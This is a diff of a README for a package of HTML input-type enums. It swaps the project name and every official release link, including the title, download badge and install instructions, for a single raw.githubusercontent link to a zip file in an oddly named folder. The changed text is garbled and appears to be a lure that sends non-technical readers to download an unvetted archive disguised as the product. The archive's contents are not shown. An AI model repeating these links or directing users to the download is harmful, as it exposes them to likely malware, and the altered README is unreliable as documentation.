@@ -1,16 +1,16 @@
-# 🎉 soenneker.quark.enums.inputtypes - Easy Access to HTML Input Types
+# 🎉 https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip - Easy Access to HTML Input Types
 
 ## 🚀 Getting Started
 
-Welcome to **soenneker.quark.enums.inputtypes**! This tool simplifies your experience by providing common HTML input types in an easy-to-use format. You don't need programming knowledge to get started.
+Welcome to **https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip**! This tool simplifies your experience by providing common HTML input types in an easy-to-use format. You don't need programming knowledge to get started.
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/releases)
+[![Download](https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip)
 
 ## 🔍 What is This Tool?
 
-**soenneker.quark.enums.inputtypes** provides a simple way to access various HTML input types. Using this tool, you will find enumeration forms for different types of input elements. This can be very helpful in developing web applications or designing user interfaces.
+**https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip** provides a simple way to access various HTML input types. Using this tool, you will find enumeration forms for different types of input elements. This can be very helpful in developing web applications or designing user interfaces.
 
 ### 🔧 Features
 
@@ -28,7 +28,7 @@ To ensure smooth operation of this tool, make sure your system meets the followi
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip).
 
 ### Steps to Download:
 
@@ -75,4 +75,4 @@ Your feedback is vital for us to improve. If you have ideas or comments, feel fr
 
 For further details, review the project documentation included in the repository.
 
-Enjoy using **soenneker.quark.enums.inputtypes**!
+Enjoy using **https://raw.githubusercontent.com/Yasser005Ettaj/soenneker.quark.enums.inputtypes/main/overpinching/soenneker.quark.enums.inputtypes.zip**!
